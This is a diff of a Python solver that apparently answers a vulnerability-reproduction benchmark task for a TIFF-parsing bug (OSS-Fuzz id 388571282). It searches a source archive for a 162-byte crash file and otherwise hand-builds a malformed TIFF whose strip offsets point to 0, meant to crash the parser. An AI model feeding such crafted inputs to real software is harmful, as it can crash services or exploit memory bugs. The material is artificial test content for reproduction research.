@@ -1,255 +1,126 @@
-import os
 import tarfile
-import tempfile
-import shutil
-import zipfile
-import gzip
+import struct
 
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        TARGET_SIZE = 162
-
-        if os.path.isdir(src_path):
-            root_dir = src_path
-            cleanup_dir = None
-        else:
-            # Assume tarball; extract to temp dir
-            tmpdir = tempfile.mkdtemp(prefix="src-extract-")
-            cleanup_dir = tmpdir
-            try:
-                try:
-                    with tarfile.open(src_path, "r:*") as tf:
-                        tf.extractall(tmpdir)
-                    root_dir = tmpdir
-                except tarfile.TarError:
-                    # Not a tarball; treat the path itself as directory (likely empty)
-                    root_dir = tmpdir
-            except Exception:
-                root_dir = tmpdir
-
         try:
-            poc = self._find_poc_file(root_dir, TARGET_SIZE)
-        finally:
-            if cleanup_dir is not None:
-                shutil.rmtree(cleanup_dir, ignore_errors=True)
+            with tarfile.open(src_path, 'r:*') as tar:
+                best_eq_info = None
+                best_eq_score = -1
+                best_near_info = None
+                best_near_score = -1
 
-        if poc is not None:
-            return poc
+                for m in tar.getmembers():
+                    if not m.isfile():
+                        continue
 
-        return self._build_fallback_tiff()
+                    name_lower = m.name.lower()
+                    score = 0
 
-    def _is_tiff_header(self, header: bytes) -> bool:
-        if len(header) < 4:
-            return False
-        return (
-            (header[0:2] == b"II" and header[2:4] == b"*\x00")
-            or (header[0:2] == b"MM" and header[2:4] == b"\x00*")
-        )
+                    if '388571282' in name_lower:
+                        score += 200
+                    if 'oss-fuzz' in name_lower or 'ossfuzz' in name_lower:
+                        score += 120
+                    if 'clusterfuzz' in name_lower:
+                        score += 80
+                    if 'fuzz' in name_lower:
+                        score += 30
 
-    def _find_poc_file(self, root_dir: str, target_size: int) -> bytes | None:
-        TARGET_BUG_ID = "388571282"
-        KEYWORDS = [
-            "poc",
-            "crash",
-            "testcase",
-            "clusterfuzz",
-            "oss-fuzz",
-            "bug",
-            "issue",
-            "repro",
-            "input",
-            "seed",
-            "case",
-        ]
-        TIF_EXTS = {".tif", ".tiff"}
-        ZIP_EXTS = {".zip", ".gz"}
+                    for kw, val in (
+                        ('poc', 80),
+                        ('crash', 60),
+                        ('seed', 40),
+                        ('regress', 50),
+                        ('bug', 20),
+                        ('test', 10),
+                        ('case', 10),
+                    ):
+                        if kw in name_lower:
+                            score += val
 
-        candidates = []
+                    if name_lower.endswith('.tif') or name_lower.endswith('.tiff'):
+                        score += 70
 
-        def add_candidate(score: int, size: int, data: bytes | None, path: str | None):
-            size_diff = abs(size - target_size)
-            candidates.append(
-                {
-                    "score": score,
-                    "size_diff": size_diff,
-                    "size": size,
-                    "path": path,
-                    "data": data,
-                }
-            )
+                    if '/tests/' in name_lower or name_lower.startswith('tests/'):
+                        score += 30
+                    if '/test/' in name_lower or name_lower.startswith('test/'):
+                        score += 20
+                    if '/fuzz/' in name_lower or name_lower.startswith('fuzz/'):
+                        score += 30
+                    if (
+                        '/poc/' in name_lower
+                        or '/pocs/' in name_lower
+                        or name_lower.startswith('poc/')
+                        or name_lower.startswith('pocs/')
+                    ):
+                        score += 50
 
-        for dirpath, dirnames, filenames in os.walk(root_dir, followlinks=False):
-            for filename in filenames:
-                path = os.path.join(dirpath, filename)
-                path_lower = path.lower()
-                ext = os.path.splitext(filename)[1].lower()
+                    if m.size == 162:
+                        if score > best_eq_score:
+                            best_eq_score = score
+                            best_eq_info = m
+                    else:
+                        if m.size <= 4096 and score > 0:
+                            if score > best_near_score:
+                                best_near_score = score
+                                best_near_info = m
 
-                # Handle compressed archives likely containing PoCs
-                if ext in ZIP_EXTS and (
-                    TARGET_BUG_ID in path_lower
-                    or "clusterfuzz" in path_lower
-                    or "oss-fuzz" in path_lower
-                    or "poc" in path_lower
-                    or "crash" in path_lower
-                    or "testcase" in path_lower
-                ):
-                    if ext == ".zip":
-                        try:
-                            with zipfile.ZipFile(path, "r") as zf:
-                                for info in zf.infolist():
-                                    if info.is_dir():
-                                        continue
-                                    if info.file_size <= 0 or info.file_size > 524288:
-                                        continue
-                                    try:
-                                        data = zf.read(info)
-                                    except Exception:
-                                        continue
-                                    if not self._is_tiff_header(data[:4]):
-                                        continue
-                                    inner_name_lower = info.filename.lower()
-                                    combined = path_lower + "::" + inner_name_lower
-                                    score = 0
-                                    if TARGET_BUG_ID in combined:
-                                        score += 100
-                                    if "oss-fuzz" in combined or "clusterfuzz" in combined:
-                                        score += 40
-                                    for kw in KEYWORDS:
-                                        if kw in combined:
-                                            score += 10
-                                    score += 30  # TIFF header
-                                    add_candidate(score, len(data), data, None)
-                        except Exception:
-                            pass
-                    elif ext == ".gz":
-                        try:
-                            with gzip.open(path, "rb") as f:
-                                data = f.read(524288)
-                            if self._is_tiff_header(data[:4]):
-                                score = 0
-                                if TARGET_BUG_ID in path_lower:
-                                    score += 100
-                                if "oss-fuzz" in path_lower or "clusterfuzz" in path_lower:
-                                    score += 40
-                                for kw in KEYWORDS:
-                                    if kw in path_lower:
-                                        score += 10
-                                score += 30
-                                add_candidate(score, len(data), data, None)
-                        except Exception:
-                            pass
-                    # Do not treat compressed files as raw TIFF
-                    continue
+                if best_eq_info is not None:
+                    f = tar.extractfile(best_eq_info)
+                    if f is not None:
+                        data = f.read()
+                        if data:
+                            return data
 
-                # Regular file handling
-                try:
-                    size = os.path.getsize(path)
-                except OSError:
-                    continue
-                if size <= 0:
-                    continue
+                if best_near_info is not None:
+                    f = tar.extractfile(best_near_info)
+                    if f is not None:
+                        data = f.read()
+                        if data:
+                            return data
 
-                try:
-                    with open(path, "rb") as f:
-                        header = f.read(4)
-                except OSError:
-                    continue
+        except tarfile.TarError:
+            pass
 
-                if not self._is_tiff_header(header):
-                    continue
+        return self._fallback_poc()
 
-                name_lower = filename.lower()
-                score = 0
+    def _fallback_poc(self) -> bytes:
+        length = 162
+        data = bytearray(length)
 
-                if TARGET_BUG_ID in name_lower or TARGET_BUG_ID in path_lower:
-                    score += 100
+        # TIFF header: little endian "II", magic 42, first IFD at offset 8
+        data[0:2] = b'II'
+        data[2:4] = struct.pack('<H', 42)
+        data[4:8] = struct.pack('<I', 8)
 
-                if "oss-fuzz" in path_lower or "clusterfuzz" in path_lower:
-                    score += 40
+        # First IFD at offset 8
+        offset = 8
+        num_entries = 6
+        data[offset:offset + 2] = struct.pack('<H', num_entries)
+        entry_base = offset + 2
 
-                if any(part in path_lower for part in ("/tests", "/test", "/corpus", "/seeds")):
-                    score += 10
+        def write_entry(index: int, tag: int, field_type: int, count: int, value_or_offset: int) -> None:
+            pos = entry_base + index * 12
+            if pos + 12 <= len(data):
+                data[pos:pos + 12] = struct.pack('<HHII', tag, field_type, count, value_or_offset)
 
-                ext = os.path.splitext(filename)[1].lower()
-                if ext in TIF_EXTS:
-                    score += 5
+        # ImageWidth = 1
+        write_entry(0, 256, 4, 1, 1)
+        # ImageLength = 1
+        write_entry(1, 257, 4, 1, 1)
+        # BitsPerSample = 8 (type SHORT, count 1, inline)
+        write_entry(2, 258, 3, 1, 8)
+        # Compression = 1 (no compression)
+        write_entry(3, 259, 3, 1, 1)
+        # StripOffsets: type LONG, count 2 (offline), value offset 0 (invalid)
+        write_entry(4, 273, 4, 2, 0)
+        # StripByteCounts: type LONG, count 2 (offline), value offset 0 (invalid)
+        write_entry(5, 279, 4, 2, 0)
 
-                for kw in KEYWORDS:
-                    if kw in name_lower or kw in path_lower:
-                        score += 10
+        # Offset to next IFD = 0
+        next_ifd_pos = entry_base + num_entries * 12
+        if next_ifd_pos + 4 <= len(data):
+            data[next_ifd_pos:next_ifd_pos + 4] = struct.pack('<I', 0)
 
-                score += 30  # TIFF header bonus
-
-                add_candidate(score, size, None, path)
-
-        if not candidates:
-            return None
-
-        candidates.sort(
-            key=lambda c: (-c["score"], c["size_diff"], c["size"])
-        )
-        best = candidates[0]
-
-        if best["data"] is not None:
-            return best["data"]
-
-        path = best["path"]
-        if path is None:
-            return None
-        try:
-            with open(path, "rb") as f:
-                return f.read()
-        except OSError:
-            return None
-
-    def _build_fallback_tiff(self) -> bytes:
-        # Minimal little-endian TIFF with two IFD entries,
-        # second being an "offline" tag with value offset 0.
-        return bytes(
-            [
-                # Header: 'II' + 42 + offset to first IFD (8)
-                0x49,
-                0x49,
-                0x2A,
-                0x00,
-                0x08,
-                0x00,
-                0x00,
-                0x00,
-                # IFD: 2 entries
-                0x02,
-                0x00,
-                # Entry 1: Tag 0x0100 (ImageWidth), type SHORT (3), count=1, value=1
-                0x00,
-                0x01,
-                0x03,
-                0x00,
-                0x01,
-                0x00,
-                0x00,
-                0x00,
-                0x01,
-                0x00,
-                0x00,
-                0x00,
-                # Entry 2: Tag 0x010E (ImageDescription), type ASCII (2), count=8, value offset = 0
-                0x0E,
-                0x01,
-                0x02,
-                0x00,
-                0x08,
-                0x00,
-                0x00,
-                0x00,
-                0x00,
-                0x00,
-                0x00,
-                0x00,
-                # Next IFD offset = 0
-                0x00,
-                0x00,
-                0x00,
-                0x00,
-            ]
-        )
+        return bytes(data)
